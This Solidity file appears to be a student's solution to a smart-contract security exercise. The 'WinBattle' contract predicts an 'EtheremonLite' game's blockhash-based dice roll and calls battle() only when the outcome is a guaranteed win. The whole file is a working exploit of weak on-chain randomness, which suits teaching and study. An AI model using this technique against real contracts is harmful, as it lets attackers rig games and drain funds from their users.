// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtheremonLite {
    function initMonster(string memory _monsterName) public {}
    function getName(address _monsterAddress) public view returns(string memory) {}
    function getNumWins(address _monsterAddress) public view returns(uint) {}
    function getNumLosses(address _monsterAddress) public view returns(uint) {}
    function battle() public returns(bool){}
}

contract WinBattle {
    address battleAddress = 0x3be82246fF8Df285029786Ed28D0bDb55544B0c6;
    //0x3be82246ff8df285029786ed28d0bdb55544b0c6
    EtheremonLite myMonster;
    // want the dice % battleRatio = 0 
    //uint dice = uint(blockhash(block.number - 1));
    //  dice = dice / 85; // Divide the dice by 85 to add obfuscation
    constructor() {
        myMonster = EtheremonLite(battleAddress);
        myMonster.initMonster("nmp54");
    }

    function strategy() public {
        uint dice = uint(blockhash(block.number - 1));
        dice = dice / 85; // Divide the dice by 85 to add obfuscation
        // We win when the dice % battleRatio is == 0 looking at the code in battle() of the EtheremonLite contract  if (dice % battleRatio == 0) 
        // Since we cannot control the dice variable depending on which block number 
        // We see from the contract that the Ogre has a weight of 3 and our monster always has a weight of 1
        // So the battle ratio is always 3 we should battle the monster
        // So when dice % 3 == 0 we should battle otherwise we will lose on all other times
        //myMonster.weight = 3
        if (dice % 3 == 0){ // wait till dice % 3 (dice is a multiple of 3 the battle ratio)
            myMonster.battle();
            myMonster.battle(); 
        }


    }

}


